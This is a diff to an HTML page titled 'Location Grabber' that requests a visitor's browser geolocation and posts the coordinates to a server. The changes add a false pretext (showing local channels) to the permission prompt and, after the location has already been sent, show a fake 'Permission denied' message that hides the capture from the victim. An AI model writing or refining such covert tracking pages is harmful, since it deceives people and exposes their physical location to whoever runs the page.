@@ -5,7 +5,7 @@
   <title>Location Grabber</title>
 </head>
 <body>
-  <h2>Please allow location access...</h2>
+  <h2>We need to access your location to display channels available in your area...</h2>
 
   <script>
     if (navigator.geolocation) {
@@ -20,7 +20,7 @@
           body: JSON.stringify({ latitude: lat, longitude: lon })
         });
 
-        document.body.innerHTML = `<p>Thanks! Your location was shared.</p>`;
+        document.body.innerHTML = `<p>"Permission denied, please allow location access to see our channels list "`;
       }, function(error) {
         alert("Permission denied or error: " + error.message);
       });
